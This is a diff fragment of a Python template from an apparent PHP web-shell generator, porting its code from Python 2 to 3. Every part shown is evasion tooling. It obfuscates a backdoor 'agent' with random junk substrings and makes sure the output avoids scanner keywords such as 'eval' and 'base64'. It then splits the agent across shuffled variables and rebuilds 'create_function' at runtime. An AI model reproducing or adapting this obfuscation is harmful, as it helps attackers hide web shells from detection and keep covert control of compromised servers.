@@ -8,7 +8,7 @@ import utils
 %><%
 
 # Does not include \ to avoid escaping termination quotes
-def find_substr_not_in_str(str, characters = string.letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'):
+def find_substr_not_in_str(str, characters = string.ascii_letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'):
 	while True:
 		substr = utils.strings.randstr(2, False, characters)
 		if not substr in str:
@@ -16,7 +16,7 @@ def find_substr_not_in_str(str, characters = string.letters + string.digits + '!
 
 def obfuscate(str, obf, division, dangerous):
 	while True:
-		polluted = obf.join(list(utils.strings.divide(str, 0, division, len(str)/division)))
+		polluted = obf.join(list(utils.strings.divide(str, 0, division, len(str)//division)))
 
 		found = False
 		for dang in dangerous:
@@ -34,9 +34,9 @@ obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, ('eval', 'bas
 
 agent_splitted_line_number = random.randint(5,8)
 
-agent_splitted = list(utils.strings.divide(obfuscated_agent, len(obfuscated_agent)/agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)/agent_splitted_line_number, agent_splitted_line_number))
+agent_splitted = list(utils.strings.divide(obfuscated_agent, len(obfuscated_agent)//agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)//agent_splitted_line_number, agent_splitted_line_number))
 
-agent_variables = list(string.letters[:])
+agent_variables = list(string.ascii_letters[:])
 random.shuffle(agent_variables)
 agent_variables_references = agent_variables[:]
 
@@ -53,7 +53,7 @@ for line in agent_splitted:
 
 	agent_list.append((agent_variables.pop(0), '%s;' % line))
 
-obfuscation_createfunc = find_substr_not_in_str('create_function', string.letters)
+obfuscation_createfunc = find_substr_not_in_str('create_function', string.ascii_letters)
 obfuscated_createfunc = obfuscate('create_function', obfuscation_createfunc, 2, ())
 
 agent_list.append((agent_variables.pop(0), "str_replace('%s','','%s');" % (obfuscation_createfunc, obfuscated_createfunc)))
